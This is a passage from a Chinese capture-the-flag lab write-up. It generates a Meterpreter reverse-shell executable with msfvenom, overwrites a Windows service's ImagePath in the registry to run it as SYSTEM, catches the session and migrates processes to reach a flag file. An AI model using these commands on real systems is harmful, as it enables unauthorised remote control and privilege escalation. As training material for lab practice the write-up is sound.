style="color:#393A34">(</span><span class="token plain">Latency </span><span class="token number" style="color:#36acaa">44</span><span class="token plain">.160355ms</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>使用 <code>msfvenom</code> 生成载荷</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ msfvenom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/x64/meterpreter/reverse_tcp </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.36 </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">7777</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> exe </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> exploit-172.22.4.36-7777.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> No arch selected, selecting arch: x64 from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No encoder specified, outputting raw payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: </span><span class="token number" style="color:#36acaa">510</span><span class="token plain"> bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final size of exe file: </span><span class="token number" style="color:#36acaa">7168</span><span class="token plain"> bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Saved as: exploit-172.22.4.36-7777.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>开启监听</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root@jmt-projekt:~</span><span class="token comment" style="color:#999988;font-style:italic"># msfconsole -q</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">This copy of metasploit-framework is </span><span class="token function" style="color:#d73a49">more</span><span class="token plain"> than two weeks old.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Consider running </span><span class="token string" style="color:#e3116c">&#x27;msfupdate&#x27;</span><span class="token plain"> to update to the latest version.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> use exploit/multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Using configured payload generic/shell_reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">multi/handler</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">set</span><span class="token plain"> payload windows/x64/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> windows/x64/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">multi/handler</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">set</span><span class="token plain"> LHOST </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LHOST </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">multi/handler</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">set</span><span class="token plain"> LPORT </span><span class="token number" style="color:#36acaa">7777</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LPORT </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">7777</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">multi/handler</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Started reverse TCP handler on </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0:7777</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>将载荷投放到靶机之后，修改服务</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Adrian</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> reg query HKLM</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SYSTEM</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CurrentControlSet</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Services</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">gupdate</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_LOCAL_MACHINE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SYSTEM</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CurrentControlSet</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Services</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">gupdate</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Type    REG_DWORD    0x10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Start    REG_DWORD    0x2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ErrorControl    REG_DWORD    0x1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ImagePath    REG_EXPAND_SZ    </span><span class="token string" style="color:#e3116c">&quot;C:\Program Files (x86)\Google\Update\GoogleUpdate.exe&quot;</span><span class="token plain"> /svc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    DisplayName    REG_SZ    Google 更新服务 </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">gupdate</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    DependOnService    REG_MULTI_SZ    RPCSS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    WOW64    REG_DWORD    0x14c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ObjectName    REG_SZ    LocalSystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Description    REG_SZ    请确保使用最新版的 Google 软件。如果停用或中断此服务，则您的 Google 软件就无法及时更新，这 意味着无法修复潜在的安全漏洞，同时某些功能也无法正常运行。如果没有任何 Google 软件使用此服务，则此服务会自行卸载。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    DelayedAutostart    REG_DWORD    0x1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_LOCAL_MACHINE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SYSTEM</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CurrentControlSet</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Services</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">gupdate</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Security</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Adrian</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> reg </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> HKLM</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SYSTEM</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CurrentControlSet</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Services</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">gupdate /v ImagePath /t REG_EXPAND_SZ /d  C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Adrian</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Desktop</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">exploit-172.22.4.36-7777.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">值 ImagePath 已存在，要覆盖吗 </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Yes/No</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">? </span><span class="token function" style="color:#d73a49">yes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">操作成功完成。</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后在 <code>cmd</code> 中启动服务</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sc start gupdate</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>即可收到回连的 Meterpreter 会话</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">multi/handler</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Started reverse TCP handler on </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0:7777</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Sending stage </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">200774</span><span class="token plain"> bytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> to </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Meterpreter session </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> opened </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1:7777 -</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1:52672</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> at </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">-07-24 09:31:38 +0800</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1 - Meterpreter session </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> closed.  Reason: Died</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这里的 <code>Reason: Died</code> 是由于会话因服务停止而自动杀死，为了避免这种情况，可以在 Meterpreter 会话建立之时及时进行进程迁移</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">multi/handler</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Started reverse TCP handler on </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0:7777</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Sending stage </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">200774</span><span class="token plain"> bytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> to </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Meterpreter session </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> opened </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1:7777 -</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1:42678</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> at </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">-07-24 09:36:24 +0800</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ps</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Process List</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> PID   </span><span class="token environment constant" style="color:#36acaa">PPID</span><span class="token plain">  Name                          Arch  Session  User                          Path</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ---   ----  ----                          ----  -------  ----                          ----</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">     </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">     </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">System Process</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain">     </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">     System                        x64   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">60</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">564</span><span class="token plain">   svchost.exe                   x64   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">        NT AUTHORITY</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SYSTEM           C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">svchost.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">84</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">4</span><span class="token plain">     Registry                      x64   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">164</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">564</span><span class="token plain">   svchost.exe                   x64   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">        NT AUTHORITY</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SYSTEM           C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">svchost.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">248</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">4</span><span class="token plain">     smss.exe                      x64   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">288</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">564</span><span class="token plain">   svchost.exe                   x64   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">352</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">344</span><span class="token plain">   csrss.exe                     x64   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">428</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">344</span><span class="token plain">   wininit.exe                   x64   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">444</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">420</span><span class="token plain">   csrss.exe                     x64   </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">5924</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">564</span><span class="token plain">   svchost.exe                   x64   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">        NT AUTHORITY</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SYSTEM           C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">svchost.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">6036</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">564</span><span class="token plain">   svchost.exe                   x64   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">        NT AUTHORITY</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SYSTEM           C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System32</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">svchost.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> migrate </span><span class="token number" style="color:#36acaa">6036</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Migrating from </span><span class="token number" style="color:#36acaa">5768</span><span class="token plain"> to </span><span class="token number" style="color:#36acaa">6036</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Migration completed successfully.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> sysinfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Computer        </span><span class="token builtin class-name">:</span><span class="token plain"> WIN19</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OS              </span><span class="token builtin class-name">:</span><span class="token plain"> Windows Server </span><span class="token number" style="color:#36acaa">2019</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">10.0</span><span class="token plain"> Build </span><span class="token number" style="color:#36acaa">17763</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Architecture    </span><span class="token builtin class-name">:</span><span class="token plain"> x64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">System Language </span><span class="token builtin class-name">:</span><span class="token plain"> zh_CN</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Domain          </span><span class="token builtin class-name">:</span><span class="token plain"> XIAORANG</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Logged On Users </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Meterpreter     </span><span class="token builtin class-name">:</span><span class="token plain"> x64/windows</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>并且发现 <code>C:\Users\Administrator\flag\flag02.txt</code> 文件</p>
